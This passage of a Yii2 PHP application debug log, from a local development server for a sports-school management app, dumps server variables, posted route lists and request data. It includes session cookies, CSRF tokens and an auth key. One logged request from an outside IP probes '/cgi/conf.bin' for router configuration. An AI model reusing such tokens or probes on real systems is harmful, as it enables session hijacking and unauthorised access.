    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58463'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769627273.3304
    'REQUEST_TIME' => 1769627273
]
2026-01-28 15:20:09 [194.50.16.253][-][kint05b760skgeis68l1arh8dg][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "cgi/conf.bin". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('cgi/conf.bin', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 15:20:09 [194.50.16.253][-][kint05b760skgeis68l1arh8dg][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11'
    'HTTP_ACCEPT_ENCODING' => 'compress, gzip'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_REFERER' => 'http://201.209.50.227:80/mainFrame.htm'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '194.50.16.253'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '11370'
    'REDIRECT_URL' => '/cgi/conf.bin'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/cgi/conf.bin'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769628009.4467
    'REQUEST_TIME' => 1769628009
]
2026-01-28 15:42:54 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:42:54 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/admin/assignment/index'
        1 => '/admin/assignment/view'
        2 => '/admin/assignment/assign'
        3 => '/admin/assignment/revoke'
        4 => '/admin/assignment/*'
        5 => '/admin/default/index'
        6 => '/admin/default/*'
        7 => '/admin/menu/index'
        8 => '/admin/menu/view'
        9 => '/admin/menu/create'
        10 => '/admin/menu/update'
        11 => '/admin/menu/delete'
        12 => '/admin/menu/*'
        13 => '/admin/permission/index'
        14 => '/admin/permission/view'
        15 => '/admin/permission/create'
        16 => '/admin/permission/update'
        17 => '/admin/permission/delete'
        18 => '/admin/permission/assign'
        19 => '/admin/permission/get-users'
        20 => '/admin/permission/remove'
        21 => '/admin/permission/*'
        22 => '/admin/role/index'
        23 => '/admin/role/view'
        24 => '/admin/role/create'
        25 => '/admin/role/update'
        26 => '/admin/role/delete'
        27 => '/admin/role/assign'
        28 => '/admin/role/get-users'
        29 => '/admin/role/remove'
        30 => '/admin/role/*'
        31 => '/admin/route/index'
        32 => '/admin/route/create'
        33 => '/admin/route/assign'
        34 => '/admin/route/remove'
        35 => '/admin/route/refresh'
        36 => '/admin/route/*'
        37 => '/admin/rule/index'
        38 => '/admin/rule/view'
        39 => '/admin/rule/create'
        40 => '/admin/rule/update'
        41 => '/admin/rule/delete'
        42 => '/admin/rule/*'
        43 => '/admin/user/index'
        44 => '/admin/user/view'
        45 => '/admin/user/delete'
        46 => '/admin/user/login'
        47 => '/admin/user/logout'
        48 => '/admin/user/signup'
        49 => '/admin/user/request-password-reset'
        50 => '/admin/user/reset-password'
        51 => '/admin/user/change-password'
        52 => '/admin/user/activate'
        53 => '/admin/user/*'
        54 => '/admin/*'
        55 => '/acces/default/index'
        56 => '/acces/default/*'
        57 => '/acces/user/index'
        58 => '/acces/user/view'
        59 => '/acces/user/delete'
        60 => '/acces/user/login'
        61 => '/acces/user/logout'
        62 => '/acces/user/signup'
        63 => '/acces/user/post-by-user'
        64 => '/acces/user/request-password-reset'
        65 => '/acces/user/reset-password'
        66 => '/acces/user/change-password'
        67 => '/acces/user/activate'
        68 => '/acces/user/*'
        69 => '/acces/*'
        70 => '/tienda/default/index'
        71 => '/tienda/default/registro-vendedor'
        72 => '/tienda/default/dashboard-vendedor'
        73 => '/tienda/default/*'
        74 => '/tienda/marketplace/index'
        75 => '/tienda/marketplace/productos'
        76 => '/tienda/marketplace/producto'
        77 => '/tienda/marketplace/tienda'
        78 => '/tienda/marketplace/tiendas'
        79 => '/tienda/marketplace/categoria'
        80 => '/tienda/marketplace/buscar'
        81 => '/tienda/marketplace/*'
        82 => '/tienda/producto/index'
        83 => '/tienda/producto/view'
        84 => '/tienda/producto/create'
        85 => '/tienda/producto/update'
        86 => '/tienda/producto/delete'
        87 => '/tienda/producto/toggle-status'
        88 => '/tienda/producto/toggle-featured'
        89 => '/tienda/producto/manage-stock'
        90 => '/tienda/producto/*'
        91 => '/tienda/tienda/index'
        92 => '/tienda/tienda/view'
        93 => '/tienda/tienda/create'
        94 => '/tienda/tienda/update'
        95 => '/tienda/tienda/delete'
        96 => '/tienda/tienda/toggle-status'
        97 => '/tienda/tienda/dashboard'
        98 => '/tienda/tienda/*'
        99 => '/tienda/*'
        100 => '/atletas/asistencia/index'
        101 => '/atletas/asistencia/view'
        102 => '/atletas/asistencia/create'
        103 => '/atletas/asistencia/registro-rapido'
        104 => '/atletas/asistencia/registrar-rapido'
        105 => '/atletas/asistencia/marcar-salida'
        106 => '/atletas/asistencia/update'
        107 => '/atletas/asistencia/delete'
        108 => '/atletas/asistencia/reporte'
        109 => '/atletas/asistencia/dashboard'
        110 => '/atletas/asistencia/registro-multiple'
        111 => '/atletas/asistencia/get-atletas-by-escuela'
        112 => '/atletas/asistencia/get-asistencias-hoy'
        113 => '/atletas/asistencia/get-info-escuela'
        114 => '/atletas/asistencia/*'
        115 => '/atletas/atletas-registro/index'
        116 => '/atletas/atletas-registro/view'
        117 => '/atletas/atletas-registro/create'
        118 => '/atletas/atletas-registro/update'
        119 => '/atletas/atletas-registro/delete'
        120 => '/atletas/atletas-registro/calcular-categoria'
        121 => '/atletas/atletas-registro/*'
        122 => '/atletas/default/index'
        123 => '/atletas/default/*'
        124 => '/atletas/*'
        125 => '/escuela_club/*'
        126 => '/ged/default/index'
        127 => '/ged/default/select-escuela'
        128 => '/ged/default/cambiar-escuela'
        129 => '/ged/default/verificar-sesion'
        130 => '/ged/default/reset-sesion'
        131 => '/ged/default/cerrar-escuela'
        132 => '/ged/default/set-school'
        133 => '/ged/default/clear-escuela'
        134 => '/ged/default/debug-mobile'
        135 => '/ged/default/escuela'
        136 => '/ged/default/cambiar-escuela-old'
        137 => '/ged/default/search-schools'
        138 => '/ged/default/buscar-escuelas'
        139 => '/ged/default/*'
        140 => '/ged/*'
        141 => '/aportes/aportes/index'
        142 => '/aportes/aportes/gestion-atleta'
        143 => '/aportes/aportes/view'
        144 => '/aportes/aportes/create'
        145 => '/aportes/aportes/update'
        146 => '/aportes/aportes/delete'
        147 => '/aportes/aportes/marcar-pagado'
        148 => '/aportes/aportes/pago-multiple'
        149 => '/aportes/aportes/pago-adelantado'
        150 => '/aportes/aportes/registro-masivo'
        151 => '/aportes/aportes/compras'
        152 => '/aportes/aportes/reporte-ejecutivo'
        153 => '/aportes/aportes/atletas-morosos'
        154 => '/aportes/aportes/procesar-pago-multiple'
        155 => '/aportes/aportes/procesar-pago-adelantado'
        156 => '/aportes/aportes/obtener-quincenas-pendientes'
        157 => '/aportes/aportes/limpiar-quincenas-anteriores'
        158 => '/aportes/aportes/migrar-datos'
        159 => '/aportes/aportes/*'
        160 => '/aportes/*'
        161 => '/reportes/default/index'
        162 => '/reportes/default/dashboard'
        163 => '/reportes/default/*'
        164 => '/reportes/reportes/atletas'
        165 => '/reportes/reportes/estadisticas-atleta'
        166 => '/reportes/reportes/asistencias'
        167 => '/reportes/reportes/deudas-pendientes'
        168 => '/reportes/reportes/exportar-pdf'
        169 => '/reportes/reportes/exportar-excel'
        170 => '/reportes/reportes/*'
        171 => '/reportes/*'
        172 => '/debug/default/db-explain'
        173 => '/debug/default/index'
        174 => '/debug/default/view'
        175 => '/debug/default/toolbar'
        176 => '/debug/default/download-mail'
        177 => '/debug/default/*'
        178 => '/debug/user/set-identity'
        179 => '/debug/user/reset-identity'
        180 => '/debug/user/*'
        181 => '/debug/*'
        182 => '/gii/default/index'
        183 => '/gii/default/view'
        184 => '/gii/default/preview'
        185 => '/gii/default/diff'
        186 => '/gii/default/action'
        187 => '/gii/default/*'
        188 => '/gii/*'
        189 => '/coordenadas/get-coordenadas-by-vista'
        190 => '/coordenadas/*'
        191 => '/municipio/get-by-edo'
        192 => '/municipio/list'
        193 => '/municipio/*'
        194 => '/parroquia/get-by-muni'
        195 => '/parroquia/get-by-muni-cod'
        196 => '/parroquia/list'
        197 => '/parroquia/*'
        198 => '/perfil/mi-informacion'
        199 => '/perfil/mis-deudas'
        200 => '/perfil/mis-representados'
        201 => '/perfil/*'
        202 => '/site/error'
        203 => '/site/captcha'
        204 => '/site/index'
        205 => '/site/acceder-sistema'
        206 => '/site/login'
        207 => '/site/logout'
        208 => '/site/contact'
        209 => '/site/about'
        210 => '/site/cambiar-password'
        211 => '/site/mi-cuenta'
        212 => '/site/testcss'
        213 => '/site/test-js'
        214 => '/site/check-redirect-loop'
        215 => '/site/get-mobile-menu'
        216 => '/site/debug-menu'
        217 => '/site/test-menu-widget'
        218 => '/site/clear-cache'
        219 => '/site/diagnosticar-menu'
        220 => '/site/reparar-menu'
        221 => '/site/diagnostico-rapido'
        222 => '/site/*'
        223 => '/tasa-dolar/index'
        224 => '/tasa-dolar/actualizar'
        225 => '/tasa-dolar/historial'
        226 => '/tasa-dolar/actualizar-automatico'
        227 => '/tasa-dolar/api-tasa-actual'
        228 => '/tasa-dolar/probar-fuentes'
        229 => '/tasa-dolar/exportar-historial'
        230 => '/tasa-dolar/get-tasa-actual'
        231 => '/tasa-dolar/*'
        232 => '/*'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '9719'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58618'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629373.9908
    'REQUEST_TIME' => 1769629373
]
2026-01-28 15:43:00 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:00 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/admin/assignment/index'
        1 => '/admin/assignment/view'
        2 => '/admin/assignment/assign'
        3 => '/admin/assignment/revoke'
        4 => '/admin/assignment/*'
        5 => '/admin/default/index'
        6 => '/admin/default/*'
        7 => '/admin/menu/index'
        8 => '/admin/menu/view'
        9 => '/admin/menu/create'
        10 => '/admin/menu/update'
        11 => '/admin/menu/delete'
        12 => '/admin/menu/*'
        13 => '/admin/permission/index'
        14 => '/admin/permission/view'
        15 => '/admin/permission/create'
        16 => '/admin/permission/update'
        17 => '/admin/permission/delete'
        18 => '/admin/permission/assign'
        19 => '/admin/permission/get-users'
        20 => '/admin/permission/remove'
        21 => '/admin/permission/*'
        22 => '/admin/role/index'
        23 => '/admin/role/view'
        24 => '/admin/role/create'
        25 => '/admin/role/update'
        26 => '/admin/role/delete'
        27 => '/admin/role/assign'
        28 => '/admin/role/get-users'
        29 => '/admin/role/remove'
        30 => '/admin/role/*'
        31 => '/admin/route/index'
        32 => '/admin/route/create'
        33 => '/admin/route/assign'
        34 => '/admin/route/remove'
        35 => '/admin/route/refresh'
        36 => '/admin/route/*'
        37 => '/admin/rule/index'
        38 => '/admin/rule/view'
        39 => '/admin/rule/create'
        40 => '/admin/rule/update'
        41 => '/admin/rule/delete'
        42 => '/admin/rule/*'
        43 => '/admin/user/index'
        44 => '/admin/user/view'
        45 => '/admin/user/delete'
        46 => '/admin/user/login'
        47 => '/admin/user/logout'
        48 => '/admin/user/signup'
        49 => '/admin/user/request-password-reset'
        50 => '/admin/user/reset-password'
        51 => '/admin/user/change-password'
        52 => '/admin/user/activate'
        53 => '/admin/user/*'
        54 => '/admin/*'
        55 => '/acces/default/index'
        56 => '/acces/default/*'
        57 => '/acces/user/index'
        58 => '/acces/user/view'
        59 => '/acces/user/delete'
        60 => '/acces/user/login'
        61 => '/acces/user/logout'
        62 => '/acces/user/signup'
        63 => '/acces/user/post-by-user'
        64 => '/acces/user/request-password-reset'
        65 => '/acces/user/reset-password'
        66 => '/acces/user/change-password'
        67 => '/acces/user/activate'
        68 => '/acces/user/*'
        69 => '/acces/*'
        70 => '/tienda/default/index'
        71 => '/tienda/default/registro-vendedor'
        72 => '/tienda/default/dashboard-vendedor'
        73 => '/tienda/default/*'
        74 => '/tienda/marketplace/index'
        75 => '/tienda/marketplace/productos'
        76 => '/tienda/marketplace/producto'
        77 => '/tienda/marketplace/tienda'
        78 => '/tienda/marketplace/tiendas'
        79 => '/tienda/marketplace/categoria'
        80 => '/tienda/marketplace/buscar'
        81 => '/tienda/marketplace/*'
        82 => '/tienda/producto/index'
        83 => '/tienda/producto/view'
        84 => '/tienda/producto/create'
        85 => '/tienda/producto/update'
        86 => '/tienda/producto/delete'
        87 => '/tienda/producto/toggle-status'
        88 => '/tienda/producto/toggle-featured'
        89 => '/tienda/producto/manage-stock'
        90 => '/tienda/producto/*'
        91 => '/tienda/tienda/index'
        92 => '/tienda/tienda/view'
        93 => '/tienda/tienda/create'
        94 => '/tienda/tienda/update'
        95 => '/tienda/tienda/delete'
        96 => '/tienda/tienda/toggle-status'
        97 => '/tienda/tienda/dashboard'
        98 => '/tienda/tienda/*'
        99 => '/tienda/*'
        100 => '/atletas/asistencia/index'
        101 => '/atletas/asistencia/view'
        102 => '/atletas/asistencia/create'
        103 => '/atletas/asistencia/registro-rapido'
        104 => '/atletas/asistencia/registrar-rapido'
        105 => '/atletas/asistencia/marcar-salida'
        106 => '/atletas/asistencia/update'
        107 => '/atletas/asistencia/delete'
        108 => '/atletas/asistencia/reporte'
        109 => '/atletas/asistencia/dashboard'
        110 => '/atletas/asistencia/registro-multiple'
        111 => '/atletas/asistencia/get-atletas-by-escuela'
        112 => '/atletas/asistencia/get-asistencias-hoy'
